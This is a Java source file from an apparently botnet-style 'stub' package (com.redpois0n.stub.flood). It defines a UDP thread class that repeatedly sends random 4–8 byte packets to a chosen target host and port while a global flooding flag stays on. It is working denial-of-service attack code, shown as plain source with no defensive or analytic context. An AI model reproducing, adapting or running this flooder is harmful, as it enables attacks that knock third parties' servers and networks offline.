package com.redpois0n.stub.flood;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

import com.redpois0n.stub.Constants;

public class UDP extends Thread {

	public String target;
	public int port;
	private DatagramSocket socket;
	private DatagramPacket packet;
	private int size;
	private Random rand = new Random();
	private byte[] bytes;

	public UDP(String t, int p) {
		target = t;
		port = p;
	}

	public void run() {
		while (Constants.flooding) {
			try {
				size = rand.nextInt();
				if (port < 0) {
				}
				if (size < 0) {
					size *= -1;
				}
				size %= 5;
				size += 4;
				socket = new DatagramSocket();
				socket.connect(InetAddress.getByName(target), port);
				bytes = new byte[size];
				rand.nextBytes(bytes);
				packet = new DatagramPacket(bytes, bytes.length);
				socket.send(packet);
				socket.close();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
